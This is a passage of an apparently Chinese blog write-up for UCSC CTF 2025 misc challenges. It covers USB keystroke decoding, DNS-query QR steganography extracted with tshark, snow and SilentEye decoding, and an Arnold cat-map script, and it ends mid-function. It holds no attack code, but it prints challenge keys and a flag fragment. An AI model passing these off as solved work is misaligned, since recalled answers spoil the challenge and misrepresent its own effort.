+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;37&#34;</span><span class="p">:</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;38&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;39&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;CAP&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;3a&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F1&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;3b&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F2&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;3c&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F3&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;3d&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F4&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;3e&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F5&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;3f&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F6&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;40&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F7&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;41&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F8&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;42&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F9&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;43&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F10&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;44&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F11&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;45&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F12&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;46&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;PRTSC&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;47&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;SCRLK&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;48&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;PAUSE&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;49&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;INS&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;4a&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;HOME&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;4b&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;PGUP&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;4c&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;DEL_FWD&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;4d&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;END&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;4e&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;PGDN&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;4f&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;RIGHT&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;50&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;LEFT&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;51&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;DOWN&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;52&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;UP&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;53&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;NUMLOCK&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;54&#34;</span><span class="p">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span> <span class="s2">&#34;55&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">,</span> <span class="s2">&#34;56&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;57&#34;</span><span class="p">:</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;58&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;ENTER&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;59&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span> <span class="s2">&#34;5a&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;5b&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;5c&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="s2">&#34;5d&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;5e&#34;</span><span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;5f&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;60&#34;</span><span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;61&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> <span class="s2">&#34;62&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span> <span class="s2">&#34;63&#34;</span><span class="p">:</span> <span class="s2">&#34;.&#34;</span><span class="p">,</span> <span class="s2">&#34;64&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;NONUS_BACK&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;65&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;APP&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;66&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;POWER&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;67&#34;</span><span class="p">:</span> <span class="s2">&#34;=&#34;</span><span class="p">,</span> <span class="s2">&#34;68&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F13&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;69&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F14&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;6a&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F15&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;6b&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F16&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;6c&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F17&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;6d&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F18&gt;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;6e&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F19&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;6f&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F20&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;70&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F21&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;71&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F22&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;72&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F23&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;73&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;F24&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 加载 USB HID 数据文件</span>
+</span></span><span class="line"><span class="cl"><span class="n">input_file</span> <span class="o">=</span> <span class="s2">&#34;1.txt&#34;</span>  <span class="c1"># 替换为你的实际路径</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解析数据并还原按键</span>
+</span></span><span class="line"><span class="cl"><span class="n">keystrokes</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hex_code</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">hid_keymap</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">hex_code</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">keystrokes</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 输出完整的按键还原结果（包括控制符号）</span>
+</span></span><span class="line"><span class="cl"><span class="n">reconstructed_text</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">keystrokes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">reconstructed_text</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当然上面的3篇文章也讲述了鼠标流量。这里代码参考<a class="link" href="https://2hi5hu.cn/archives/ucsc2025#noshark"  target="_blank" rel="noopener"
+    >UCSCCTF2025 - Misc - WriteUp|2hi5hu-研习足迹</a></p>
+<h3 id="noshark">No.shArk
+</h3><p>先把所有可疑文件全部dump出来</p>
+<img src="image-20250422114434559.png" alt="image-20250422114434559" style="zoom:50%;" />
+<img src="image-20250422114459409.png" alt="image-20250422114459409" style="zoom:50%;" />
+<p>经过分析，发现可疑文件cat.png（010打开发现key）</p>
+<p><img src="/p/2025-ucsc-ctf/image-20250422184730142.png"
+	width="713"
+	height="151"
+	srcset="/p/2025-ucsc-ctf/image-20250422184730142_hu_a2a8f288bdd909a8.png 480w, /p/2025-ucsc-ctf/image-20250422184730142_hu_3987cecc875826cb.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250422184730142"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="472"
+		data-flex-basis="1133px"
+	
+></p>
+<p>png末尾有keyis:keykeyishere，不知道啥用先放这</p>
+<h4 id="dns协议隐写">dns协议隐写
+</h4><p>这时候发现有些流量包含有大量01数据，显然很可疑</p>
+<img src="image-20250422190442769.png" alt="image-20250422190442769" style="zoom:50%;" />
+<p>根据流量地址用tshark导出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tshark -r complete.pcapng -T fields -e dns.qry.name -Y &#39; ip.dst == 114.114.114.114&#39; | sed &#39;/^\s*$/d&#39; | uniq &gt; data.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>去除无用数据，放到010文本编辑器</p>
+<img src="image-20250422192539534.png" alt="image-20250422192539534" style="zoom:50%;" />
+<p>乍一看不就是二维码嘛，直接写代码转换为二维码（由于这个数据有25行，51列，所以横向2字符一像素）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 原始数据</span>
+</span></span><span class="line"><span class="cl"><span class="n">data_str</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">11111111111111001100000000001100110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11000000000011001100001111111100000000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11001111110011001111000011000011110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11001111110011001111110011000000110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11001111110011000011110011001100110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11000000000011001111110000000000110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11111111111111001100110011001100110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000000000111100110011110000000000000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11110000111111000000110011110000000000110011111111
+</span></span></span><span class="line"><span class="cl"><span class="s2">00001111111100001100000000111111110011001111001111
+</span></span></span><span class="line"><span class="cl"><span class="s2">11110011000011001111110000000011001111111100110000
+</span></span></span><span class="line"><span class="cl"><span class="s2">00001100001100000011000011001111110000111100111100
+</span></span></span><span class="line"><span class="cl"><span class="s2">11001100111111000000001100111100001111001111000011
+</span></span></span><span class="line"><span class="cl"><span class="s2">11000000001100111111110011000011111100001111111100
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000011000011001111111111110000000000001100
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000001111111100110011111100110000110000
+</span></span></span><span class="line"><span class="cl"><span class="s2">11111111001111001100000011110000111111111100000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000001100000000111100110000001111001111
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000000000110000000011110011001111000000
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000001100000011001100110000001100111111
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000001111111100111100111111111100110011
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000000011110011000011001111110000111111
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000000011001111111111111100110000111100
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000001111111100110011001111000011111100
+</span></span></span><span class="line"><span class="cl"><span class="s2">00000000000000001100000011110011000011110011111111
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解析数据</span>
+</span></span><span class="line"><span class="cl"><span class="n">lines</span> <span class="o">=</span> <span class="n">data_str</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">height</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">width</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 每两个字符表示一个像素</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建图像数组</span>
+</span></span><span class="line"><span class="cl"><span class="n">image_array</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">((</span><span class="n">height</span><span class="p">,</span> <span class="n">width</span><span class="p">),</span> <span class="n">dtype</span><span class="o">=</span><span class="n">np</span><span class="o">.</span><span class="n">uint8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">y</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pixel</span> <span class="o">=</span> <span class="n">line</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pixel</span> <span class="o">==</span> <span class="s1">&#39;11&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">image_array</span><span class="p">[</span><span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">//</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>  <span class="c1"># 黑色</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">pixel</span> <span class="o">==</span> <span class="s1">&#39;00&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">image_array</span><span class="p">[</span><span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">//</span> <span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">255</span>  <span class="c1"># 白色</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 创建图像</span>
+</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">fromarray</span><span class="p">(</span><span class="n">image_array</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="s1">&#39;L&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">img</span><span class="o">.</span><span class="n">resize</span><span class="p">((</span><span class="n">width</span> <span class="o">*</span> <span class="mi">10</span><span class="p">,</span> <span class="n">height</span> <span class="o">*</span> <span class="mi">10</span><span class="p">),</span> <span class="n">resample</span><span class="o">=</span><span class="n">Image</span><span class="o">.</span><span class="n">NEAREST</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">img</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s2">&#34;output_image.png&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">img</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250422203006916.png" alt="image-20250422203006916" style="zoom:50%;" />
+<p>但是少了2个定位符，直接上ps，将左上的定位符ps上去</p>
+<img src="image-20250422202757288.png" alt="image-20250422202757288" style="zoom:50%;" />
+<p>微信扫码得到Y0U_Fi8d_ItHa@aaHH（微信识别二维码功能很强，我ps技术不好很多二维码识别工具都不好识别，但是微信可以）</p>
+<h4 id="snow隐写">snow隐写
+</h4><p>然后发现w1.html也很可疑，发现其数据里有大量制表符。</p>
+<img src="image-20250422185322450.png" alt="image-20250422185322450" style="zoom:50%;" />
+<p>刚好符合snow隐写</p>
+<p><img src="/p/2025-ucsc-ctf/image-20250422185109297.png"
+	width="1066"
+	height="209"
+	srcset="/p/2025-ucsc-ctf/image-20250422185109297_hu_49f9a95efa38e41.png 480w, /p/2025-ucsc-ctf/image-20250422185109297_hu_81e60e9cf2b913c9.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250422185109297"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="510"
+		data-flex-basis="1224px"
+	
+></p>
+<p>然后snow解密得到一半flag。但是前面的key试了不对，所以试这个二维码扫出的值，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">snow.exe -C -p password filename
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250422203720090.png" alt="image-20250422203720090" style="zoom:50%;" />
+<p><code>11ef-b3b6-a4b1c1c5a2d2}</code></p>
+<h4 id="jpg-silenteye隐写">jpg silenteye隐写
+</h4><p>但是我们从FTP-DATA导出来一jpg，还一个密钥没用，所以这里想到考关于jpg隐写，尝试一番想到silenteye，密码是前面的key，得到3个字符与其值</p>
+<img src="image-20250422204124804.png" alt="image-20250422204124804" style="zoom:50%;" />
+<p><code>shuffle=5,a=7,b=3</code></p>
+<h4 id="arnold猫脸变换">Arnold猫脸变换
+</h4><p>这里由这些参数和cat.png与宽高大小相等可以想到猫脸变换（变换后图像变成了像白噪声一样无意义的图像，符合图像。并且其只要确定shuffle,a,b这三个参数即可还原图片）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">matplotlib.pyplot</span> <span class="k">as</span> <span class="nn">plt</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">cv2</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">img</span> <span class="o">=</span> <span class="n">cv2</span><span class="o">.</span><span class="n">imread</span><span class="p">(</span><span class="s1">&#39;cat.png&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">arnold_encode</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">shuffle_times</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">arnold_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="p">,</span> <span class="n">w</span> <span class="o">=</span> <span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">N</span> <span class="o">=</span> <span class="n">h</span>  <span class="c1"># 或N=w</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">time</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">shuffle_times</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ori_x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">h</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">ori_y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_x</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">*</span> <span class="n">ori_x</span> <span class="o">+</span> <span class="n">b</span> <span class="o">*</span> <span class="n">ori_y</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
+</span></span><span class="line"><span class="cl">                <span class="n">new_y</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">ori_x</span> <span class="o">+</span> <span class="p">(</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="n">ori_y</span><span class="p">)</span> <span class="o">%</span> <span class="n">N</span>
+</span></span><span class="line"><span class="cl">                <span class="n">arnold_image</span><span class="p">[</span><span class="n">new_x</span><span class="p">,</span> <span class="n">new_y</span><span class="p">,</span> <span class="p">:]</span> <span class="o">=</span> <span class="n">image</span><span class="p">[</span><span class="n">ori_x</span><span class="p">,</span> <span class="n">ori_y</span><span class="p">,</span> <span class="p">:]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="n">arnold_image</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">cv2</span><span class="o">.</span><span class="n">imwrite</span><span class="p">(</span><span class="s1">&#39;flag_arnold_encode.png&#39;</span><span class="p">,</span> <span class="n">arnold_image</span><span class="p">,</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">cv2</span><span class="o">.</span><span class="n">IMWRITE_PNG_COMPRESSION</span><span class="p">),</span> <span class="mi">0</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">arnold_image</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">arnold_decode</span><span class="p">(</span><span class="n">image</span><span class="p">,</span> <span class="n">shuffle_times</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decode_image</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="n">image</span><span class="o">.</span><span class="n">shape</span><span class="p">)</span>
